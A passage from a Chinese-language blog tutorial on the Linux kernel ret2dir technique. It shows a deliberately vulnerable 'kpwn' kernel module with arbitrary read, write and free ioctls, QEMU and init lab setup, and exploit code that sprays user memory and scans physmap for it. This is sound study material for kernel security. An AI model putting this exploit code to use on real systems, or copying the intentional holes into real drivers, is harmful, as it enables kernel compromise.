-ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,(<span class="type">void</span> *)&amp;buffer,<span class="number">0x8</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">del_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//用户态任意释放内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    kfree((<span class="type">void</span> *)args-&gt;addr);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">kpwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line">    <span class="type">long</span> ret = -EINVAL;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(&amp;in,(<span class="type">void</span> *)arg,<span class="keyword">sizeof</span>(in)))&#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> READ_ANY:</span><br><span class="line">            ret = read_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WRITE_ANY:</span><br><span class="line">            ret = write_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEL_ANY:</span><br><span class="line">            ret = del_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ADD_ANY:</span><br><span class="line">            ret = add_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open =      <span class="literal">NULL</span>,</span><br><span class="line">    .release =   <span class="literal">NULL</span>,</span><br><span class="line">    .read =      <span class="literal">NULL</span>,</span><br><span class="line">    .write =     <span class="literal">NULL</span>,</span><br><span class="line">    .unlocked_ioctl = kpwn_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">misc</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name  = <span class="string">&quot;kpwn&quot;</span>,</span><br><span class="line">    .fops = &amp;fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kpwn_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    misc_register(&amp;misc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kpwn_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye hackern&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;misc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kpwn_init);</span><br><span class="line">module_exit(kpwn_exit);</span><br></pre></td></tr></table></figure></div>
+
+<p>使用如下makefile进行编译内核模块，这里<strong>KERNELDR</strong>需要换成自己编译好的内核目录<strong>obj-m</strong>指定了目标输出文件：</p>
+<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">modules_prepare:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules_prepare</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.mod.c .tmp_versions *.mod *.order *.symvers</span><br></pre></td></tr></table></figure></div>
+
+<p>我使用的启动脚本如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// run.sh</span></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -m <span class="number">150</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>
+
+<p>文件系统中的init文件如下：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod myko.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这里我在手动创建文件系统时遇到了一些问题，由于lib中的命令都是用静态编译的<strong>busybox</strong>链接实现，我一开始是直接利用busybox的list指令列出所有可用的函数，然后全部解析到lib目录中。但是这个list中并不包括 <strong>setuidgid</strong> 这个命令，导致不能成功进入内核，所以还需要手动导一下<strong>setgiduid</strong>，自动化脚本如下。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> $(busybox --list); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">ln</span> -sf busybox <span class="variable">$cmd</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ln</span> -sf busybox setuidgid</span><br></pre></td></tr></table></figure></div>
+
+<p>之后我们可以写一个exp来验证ret2dir手法核心原理，我们的exp先准备好一些交互用的函数：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;			<span class="comment">//用来打印地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们在main函数中先用add_any函数申请一块内存，然后靠着返回的地址在用户态打印出来看看。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>];</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308231319166.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232224327.png"
+                      class=""
+                >
+
+<p>然后我们去查询对应内核版本的内存布局情况，主要用的是<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux" >这个网站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，选择对应的版本后进入<code>source/Documentation/x86/x86_64/mm.txt</code>即可查看内存布局（有时候是mm.rst）。这里我用的内核版本是linux-5.15.153，查询到的结果如下，我们kmalloc申请到的内存确实是在<code>direct mapping of all physical memory</code>中的，也就是大家所称为的<strong>physmap</strong>。这里我在调试时喷射的内存在<strong>kmalloc</strong>申请到的内存的更高地址处，这里获取slab分配的地址时其实不用像原文一样进行按位与处理。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/image-20250308232101958.png"
+                      class=""
+                >
+
+<p>之后就可以进行内存喷射并且搜索内存了，比如有如下exp：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -o exp</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int32_t</span> s32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int64_t</span> s64;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loginfo</span><span class="params">(<span class="type">char</span> *tag)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s] &quot;</span>,tag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loglx</span><span class="params">(<span class="type">char</span> *tag,<span class="type">uint64_t</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[lx] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %-20s &quot;</span>,tag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;: %-#16lx&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span>        </span><br><span class="line">    <span class="type">uint64_t</span> addr;     </span><br><span class="line">    <span class="type">uint64_t</span> size;     </span><br><span class="line">    <span class="type">char</span> *buf;  </span><br><span class="line">&#125;;                     </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_any</span><span class="params">(<span class="type">int</span> fd,u64 size,<span class="type">char</span> *buf)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,ADD_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">read_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,READ_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_any</span><span class="params">(<span class="type">int</span> fd,u64 addr,<span class="type">char</span> *buf,u64 size)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    in.buf=buf;</span><br><span class="line">    in.size=size;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,WRITE_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">del_any</span><span class="params">(<span class="type">int</span> fd,u64 addr)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    in.addr = addr;</span><br><span class="line">    <span class="type">long</span> res = ioctl(fd,DEL_ANY,&amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> spray_times 32*32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mp_size 1024*64</span></span><br><span class="line"><span class="type">void</span> *spray[spray_times];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kpwn&quot;</span>,O_RDONLY); </span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 *buf64 = (u64 *)buf;</span><br><span class="line">    add_any(fd,<span class="number">0x200</span>,buf64);</span><br><span class="line">    u64 slab_addr = buf64[<span class="number">0</span>] &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    loglx(<span class="string">&quot;slab_addr&quot;</span>,slab_addr);</span><br><span class="line">    del_any(fd,slab_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;spray_times;i++)&#123;</span><br><span class="line">        <span class="comment">// 内存喷射，大量在用户空间申请内存</span></span><br><span class="line">        <span class="type">void</span> *mp;</span><br><span class="line">        mp = mmap(<span class="literal">NULL</span>,mp_size,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(mp==MAP_FAILED)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memset</span>(mp,<span class="string">&#x27;A&#x27;</span>,mp_size);</span><br><span class="line">        spray[i]=mp;</span><br><span class="line">    &#125;</span><br><span class="line">    loginfo(<span class="string">&quot;searching\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (u64 addr=slab_addr;addr&lt;<span class="number">0xffffc80000000000</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">        <span class="comment">// 内存搜索，寻找连串的A开始的地址，也就是对应用户空间相应的内存</span></span><br><span class="line">        <span class="type">char</span> *target = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">        <span class="type">char</span> *dirty = <span class="string">&quot;BBBBBBBB&quot;</span>;</span><br><span class="line">        u64 pos = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">        read_any(fd,addr,buf,<span class="number">0x1000</span>);</span><br><span class="line">        pos = (u64)memmem(buf,<span class="number">0x1000</span>,target,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (pos)&#123;</span><br><span class="line">            u64 addr_to_change = addr + (pos-(u64)buf);</span><br><span class="line">            loglx(<span class="string">&quot;physmap hit!&quot;</span>,addr);</span><br><span class="line">            loglx(<span class="string">&quot;addr_to_change&quot;</span>,addr_to_change);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
